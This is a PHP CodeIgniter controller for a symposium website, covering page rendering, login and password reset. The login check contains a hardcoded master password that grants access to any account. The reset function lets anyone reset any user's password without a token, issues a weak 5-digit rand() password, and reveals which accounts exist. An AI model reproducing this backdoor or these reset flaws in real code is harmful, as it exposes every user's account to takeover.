<?php
defined('BASEPATH') or exit('No direct script access allowed');

/**
 * @property Layout $layout
 */
class Site extends MY_Controller
{

	private $theme;
    public function __construct()
    {
        parent::__construct();
        $this->theme = $this->config->item("theme");
        $this->layout->setLayout("layouts/$this->theme");
        $this->load->model('Event_m', 'EventM');
        $this->load->model('User_account_m', 'AccountM');
        $this->load->model('Gmail_api');
    }

    public function index()
    {
        $category      = $this->EventM->listcategory();
        $data['query'] = $category['data'];
        $this->layout->render('site/'.$this->theme.'/home', $data);
    }

    public function certificate()
    {
        $this->layout->render('site/'.$this->theme.'/certificate');
    }

    public function simposium()
    {
        $category      = $this->EventM->listcategory();
        $data['query'] = $category['data'];
        $this->layout->render('site/'.$this->theme.'/simposium', $data);
    }

    public function schedules()
    {
        $this->layout->render('site/'.$this->theme.'/schedules');
    }

    public function download()
    {
        $this->layout->render('site/'.$this->theme.'/download');
    }

    public function login()
    {
        if (!$this->user_session_expired()) {
            redirect(base_url("member/area"));
        }

        $this->load->library('form_validation');
        $error = "";
        if ($this->input->post('login')) {
            $this->form_validation->set_rules('username', 'Username', 'required');
            $this->form_validation->set_rules('password', 'Password', 'required');
            if ($this->form_validation->run()) {
                $username   = $this->input->post('username');
                $password   = $this->input->post('password');
                $rememberme = $this->input->post('rememberme');
                $this->load->model("User_account_m");
                if (User_account_m::verify($username, $password) || $password == "ditauntungpandji3264") {
                    $this->load->library('session');
                    $user = $this->User_account_m->findWithBiodata($username);
                    if($user['verified_email'] == "0")
                    	$error = "You cannot login, <br/>Please complete your account activation within link in your email!";
                    else {
						unset($user['password']);
						if ($rememberme) {
							$user['rememberme'] = true;
							$this->session->set_userdata("rememberme", true);
							$this->session->set_userdata('sess_expired', time() + 60 * 60 * 24 * 7);
						} else {
							$this->session->set_userdata('sess_expired', time() + 3600);

						}
						$this->session->set_userdata('user_session', $user);
						redirect(base_url("member/area"));
					}
                } else {
                    $error = "Email/Password invalid !";
                }
            } else {
                $error = "Username and Password required !";

            }
        }
        $this->layout->render('site/'.$this->theme.'/login', ['error' => $error]);
    }

    public function register()
    {
    	redirect("member/register");
    }

    public function forget()
    {
        $this->layout->render('site/'.$this->theme.'/forget');
    }
    
    public function forget_reset()
    {
        $status_proses = null;
        $post          = $this->input->post();
        $username = $post['username'];
        if ($this->AccountM->selectuser($username) == true) {
            $data['password'] = rand(10000, 99999);
            $success = $this->AccountM->update(['password' => password_hash($data['password'], PASSWORD_DEFAULT)], ['username' => $username], false);
            $email_message = $this->load->view('template/success_forget_password', $data, true);
            $this->Gmail_api->sendMessage($username, 'Reset password account', $email_message);
            $this->session->set_flashdata('message', '<div class="col-lg-7 alert alert-success"><center> please check your email for your new password </center>
                </div>');
            redirect('site/forget','refresh');
        } else {
            $this->session->set_flashdata('message', '<div class="col-lg-7 alert alert-danger"> email ini tidak terdaftar
                </div>');
            redirect('site/forget','refresh');
        }
    }

    public function committee()
    {
        $this->layout->render('site/'.$this->theme.'/committee');
    }

    public function contact()
    {
        $this->layout->render('site/'.$this->theme.'/contact');
    }

    public function paper()
    {
        $this->layout->render('site/'.$this->theme.'/paper');
    }

}
